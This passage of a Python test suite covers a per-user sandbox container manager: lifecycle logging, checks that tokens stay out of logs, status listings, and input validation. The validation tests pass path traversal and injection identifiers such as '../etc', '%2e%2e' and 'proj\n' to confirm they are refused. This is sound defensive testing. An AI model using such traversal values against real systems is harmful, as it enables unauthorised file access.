    stopped = [r.getMessage() for r in caplog.records if "stopped" in r.getMessage()]
    assert len(started) == 1 and len(stopped) == 1
    for line in started + stopped:
        assert key in line and a["instance"] in line and sc.projects_hash(["projA"]) in line
    assert "reason=operator" in stopped[0]
    for secret in (a["token"], a["tunnel_token"], ALICE, sc.reservation_key(ALICE, a["instance"])):
        assert secret not in text


async def test_status_and_list_running(world):
    a = await world.mgr.ensure(ALICE, ["projA"])
    world.clock.now += 5
    await world.mgr.ensure(ALICE, [], view=sc.VIEW_ACT_AS)
    status = world.mgr.status(ALICE)
    assert set(status) == {"instances"} and len(status["instances"]) == 2
    own = next(i for i in status["instances"] if i["view"] == "own")
    assert set(own) == {"instance", "view", "state", "projects_hash", "created_at", "last_used",
                        "lease_kinds", "stop_at", "stop_reason", "warn", "reverse_port",
                        *sc.STATUS_OPTIONAL_KEYS}
    assert own["reverse_port_state"] == sc.REVERSE_PORT_NO_POOL
    assert own["instance"] == a["instance"] and own["projects_hash"] == sc.projects_hash(["projA"])
    assert own["stop_at"] == own["last_used"] + sc.IDLE_MINUTES_DEFAULT * 60
    assert a["token"] not in json.dumps(status) and a["tunnel_token"] not in json.dumps(status)
    assert world.mgr.status(BOB) == {"instances": []}
    listed = world.mgr.list_running()
    assert {(i["user_id"], i["view"]) for i in listed} == {(ALICE, "own"), (ALICE, "act_as")}
    first = next(i for i in listed if i["view"] == "own")
    assert first == {"user_id": ALICE, "view": "own", "instance": a["instance"], "host": a["host"],
                     "token": a["token"], "state": "running", "reverse_port": sc.DEFAULT_REVERSE_PORT,
                     "reverse_port_state": sc.REVERSE_PORT_NO_POOL}
    assert set(first) - set(sc.LIST_OPTIONAL_KEYS) == {"user_id", "view", "instance", "host", "token", "state"}


@pytest.mark.parametrize("old_switch", ["shared", "per_user", ""])
async def test_the_old_mode_switch_changes_nothing(world, old_switch):
    # An .env or compose file from before the shared container went may still set it.
    world.mp.setenv("KALI_SANDBOX_MODE", old_switch)
    assert not hasattr(world.mgr, "mode")
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert ans["state"] == "running" and "mode" not in ans
    assert [c.name for c in world.created(ALICE)] == [ans["host"]]
    assert "mode" not in world.mgr.status(ALICE)
    starting = await world.mgr.ensure(BOB, ["projB"], wait=False)
    assert set(starting) == set(sc.ENSURE_STARTING_KEYS)
    with pytest.raises(sm.SandboxInvalid):
        await world.mgr.ensure(ALICE, [".staging"])


@pytest.mark.parametrize("projects,user,view,code", [
    (["../etc"], ALICE, "own", sc.ERR_INVALID_PROJECT_ID),
    ([".staging"], ALICE, "own", sc.ERR_INVALID_PROJECT_ID),
    (["a/b"], ALICE, "own", sc.ERR_INVALID_PROJECT_ID),
    (["%2e%2e"], ALICE, "own", sc.ERR_INVALID_PROJECT_ID),
    (["proj\n"], ALICE, "own", sc.ERR_INVALID_PROJECT_ID),
    (["CON"], ALICE, "own", sc.ERR_INVALID_PROJECT_ID),
    ("projA", ALICE, "own", sc.ERR_INVALID_PROJECT_ID),
    (["projA"], "../alice", "own", sc.ERR_INVALID_USER_ID),
    (["projA"], "", "own", sc.ERR_INVALID_USER_ID),
    (["projA"], ALICE, "admin", sc.ERR_INVALID_VIEW),
])
async def test_invalid_project_id_refused_before_any_docker_call(world, projects, user, view, code):
    with pytest.raises(sm.SandboxInvalid) as e:
        await world.mgr.ensure(user, projects, view=view)
    assert e.value.code == code and e.value.status == 400
    assert world.d.calls == [] and world.ledger.sandbox_keys() == set()
    assert os.listdir(world.local[sc.MOUNT_WORKSPACE]) == []
    assert os.listdir(world.local[sc.MOUNT_OUTPUT]) == []
